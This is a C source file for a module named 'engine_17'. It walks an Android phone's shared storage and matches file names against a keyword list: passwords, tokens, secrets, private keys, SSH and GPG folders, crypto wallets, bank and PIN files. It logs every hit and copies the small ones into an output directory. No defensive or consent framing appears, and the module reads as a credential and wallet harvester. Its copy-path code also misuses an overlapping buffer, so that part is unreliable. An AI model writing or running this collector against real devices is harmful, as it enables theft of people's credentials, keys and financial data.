// engine_17_hidden.c - Hidden/interesting files detector
#include "common.h"
static int write_file_with_name(const char *dir, const char *name, const char *content) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return write_file(p, content);
}
static void parent_dir(const char *path, char *out, size_t sz) {
    strncpy(out, path, sz); char *p = strrchr(out, '/');
    if (p) *p = 0;
}
static int scan_hidden(const char *base, const char *out, int depth, FILE *lf) {
    DIR *d = opendir(base); if (!d || depth > 6) return 0;
    struct dirent *e; char sp[MAX_PATH]; int n = 0;
    while ((e = readdir(d)) != NULL) {
        if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
        snprintf(sp, sizeof(sp), "%s/%s", base, e->d_name);
        struct stat st; if (stat(sp, &st) != 0) continue;
        int is_hidden = (e->d_name[0] == '.');
        int is_interesting = 0;
        const char *interesting_names[] = {
            "backup", "Backup", "BACKUP", "backups", "Backups",
            "backup", "restore", "Restore", "migrate", "Migrate",
            "password", "Password", "PASSWORD", "passwd", "Passwd",
            "credential", "Credential", "token", "Token", "TOKEN",
            "secret", "Secret", "SECRET", "key", "Key", "KEY",
            "private", "Private", "PRIVATE", "vpn", "VPN", "Vpn",
            "wallet", "Wallet", "WALLET", "crypto", "Crypto", "CRYPTO",
            "bank", "Bank", "BANK", "pin", "Pin", "PIN",
            "auth", "Auth", "AUTH", "login", "Login", "LOGIN",
            ".git", ".ssh", ".gnupg", ".pgp", ".key", ".pem",
            "id_rsa", "id_dsa", "id_ecdsa",
            NULL
        };
        for (int i = 0; interesting_names[i]; i++) {
            if (strstr(e->d_name, interesting_names[i]) != NULL) { is_interesting = 1; break; }
        }
        if (S_ISDIR(st.st_mode)) {
            if (is_hidden || is_interesting) {
                if (lf) fprintf(lf, "DIR,%s,%lld,%lo,%ld\n", sp, (long long)st.st_size,
                    (unsigned long)(st.st_mode & 0777), (long)st.st_mtime);
                n++;
            }
            n += scan_hidden(sp, out, depth + 1, lf);
        } else if (S_ISREG(st.st_mode)) {
            if (is_hidden || is_interesting || st.st_size > 52428800) {
                if (lf) fprintf(lf, "FILE,%s,%lld,%lo,%ld\n", sp, (long long)st.st_size,
                    (unsigned long)(st.st_mode & 0777), (long)st.st_mtime);
                n++;
                // Copy hidden interesting small files
                if ((is_hidden || is_interesting) && st.st_size > 0 && st.st_size < 1048576) {
                    char dst[MAX_PATH * 2];
                    snprintf(dst, sizeof(dst), "%s/files/%s", out, sp);
                    char *clean = dst; while (*clean) { if (*clean == '/') *clean = '_'; clean++; }
                    snprintf(dst, MAX_PATH * 2, "%s/files/H_%s", out, dst);
                    if (strlen(dst) < 240) {
                        char pd[MAX_PATH]; parent_dir(dst, pd, sizeof(pd));
                        mkdir_p(strlen(pd) ? pd : ".");
                        copy_file(sp, dst);
                    }
                }
            }
        }
    } closedir(d); return n;
}
int main(int argc, char **argv) {
    const char *outdir = argc > 1 ? argv[1] : ".";
    char res[MAX_PATH], jsonname[MAX_PATH];
    snprintf(res, sizeof(res), "%s/hidden", outdir); mkdir_p(res);
    snprintf(jsonname, sizeof(jsonname), "%s/.engine_17.json", outdir); json_start(jsonname);
    mkdir_p(res); char subfiles[MAX_PATH]; snprintf(subfiles, sizeof(subfiles), "%s/files", res); mkdir_p(subfiles);
    int count = 0;
    char idxpath[MAX_PATH]; snprintf(idxpath, sizeof(idxpath), "%s/hidden_index.csv", res);
    FILE *lf = fopen(idxpath, "w");
    if (lf) fprintf(lf, "type,path,size,perms,mtime\n");
    const char *dirs[] = {
        "/storage/emulated/0/", "/sdcard/",
        NULL
    };
    for (int i = 0; dirs[i]; i++) {
        if (dir_exists(dirs[i])) count += scan_hidden(dirs[i], res, 0, lf);
    }
    if (lf) { fclose(lf); count++; }
    json_ki("files_extracted", count); json_end();
    printf("{\"engine\":\"hidden\",\"status\":\"ok\",\"files\":%d}\n", count);
    return 0;
}
